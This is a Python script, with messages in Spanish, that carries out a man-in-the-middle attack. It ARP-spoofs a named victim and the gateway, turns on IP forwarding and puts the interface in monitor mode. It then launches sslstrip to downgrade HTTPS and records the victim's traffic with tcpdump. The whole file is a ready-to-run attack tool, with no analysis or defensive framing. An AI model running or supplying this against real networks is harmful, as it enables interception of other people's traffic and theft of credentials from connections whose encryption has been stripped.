import os
import sys
import threading
import time
import random
import subprocess
import argparse
from scapy.all import *

def get_mac(ip):
    ans, _ = arping(ip)
    for s, r in ans:
        return r[Ether].src
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[-] No se pudo obtener la dirección MAC de {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    print(f"[+] Enviando paquete ARP: {target_ip} está asociado con {spoof_ip}")

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac is None or spoof_mac is None:
        print("[-] No se pudo obtener la dirección MAC de uno de los dispositivos")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)
    print(f"[+] Restaurando ARP: {target_ip} está asociado con {spoof_ip}")

def mitm(target_ip, gateway_ip):
    try:
        print("[*] Iniciando ataque MITM [Ctrl+C para detener]")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(random.randint(1, 3))  # Tiempo de espera aleatorio entre 1 y 3 segundos
    except KeyboardInterrupt:
        print("[*] Deteniendo ataque MITM")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP restaurado")

def start_sslstrip(port):
    print(f"[*] Iniciando sslstrip en el puerto {port}")
    subprocess.Popen(['sslstrip', '-l', str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def start_tcpdump(interface, output_file):
    print(f"[*] Iniciando tcpdump en la interfaz {interface}, guardando en {output_file}")
    subprocess.Popen(['tcpdump', '-i', interface, '-w', output_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def setup_monitor_mode(interface):
    print(f"[*] Configurando {interface} en modo monitor")
    os.system(f'sudo airmon-ng check kill')
    os.system(f'sudo airmon-ng start {interface}')
    new_interface = f'{interface}mon'
    return new_interface

def main():
    parser = argparse.ArgumentParser(description="Script de ataque MITM con ARP Spoofing, sslstrip y tcpdump")
    parser.add_argument("target_ip", help="IP de la víctima")
    parser.add_argument("gateway_ip", help="IP del gateway")
    parser.add_argument("interface", help="Interfaz de red")
    parser.add_argument("--sslstrip-port", type=int, default=8080, help="Puerto para sslstrip (default: 8080)")
    parser.add_argument("--tcpdump-output", default="mitm.pcap", help="Archivo de salida para tcpdump (default: mitm.pcap)")

    args = parser.parse_args()

    # Configurar modo monitor
    monitor_interface = setup_monitor_mode(args.interface)

    # Habilitar el reenvío de paquetes
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Iniciar sslstrip y tcpdump
    start_sslstrip(args.sslstrip_port)
    start_tcpdump(monitor_interface, args.tcpdump_output)

    # Iniciar ARP Spoofing
    mitm_thread = threading.Thread(target=mitm, args=(args.target_ip, args.gateway_ip))
    mitm_thread.start()

if __name__ == "__main__":
    main()
